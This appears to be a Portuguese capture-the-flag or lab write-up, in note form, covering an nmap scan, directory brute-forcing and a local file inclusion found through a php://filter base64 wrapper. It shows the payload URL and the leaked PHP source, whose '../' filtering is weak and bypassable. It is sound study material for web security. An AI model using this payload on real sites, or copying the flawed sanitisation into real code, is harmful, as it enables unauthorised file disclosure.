
NMAP
![[Pasted image 20240224064224.png]]
Bruteforce de diretórios nao trouxe nada muito importante
![[Pasted image 20240224070551.png]]

Identifiquei um parametro vulnerável a LFI usando PHP WRAPERS filter convertendo toda a saida para base64
![[Pasted image 20240224070715.png]]
```html
10.10.109.224/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

Dessa forma o resultado sair em base64, é necessário converter.
```
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php
```

Com essa saida identificamos que o index.php faz algum tipo de sanitização dos imputs alterando caracteres como ../ e .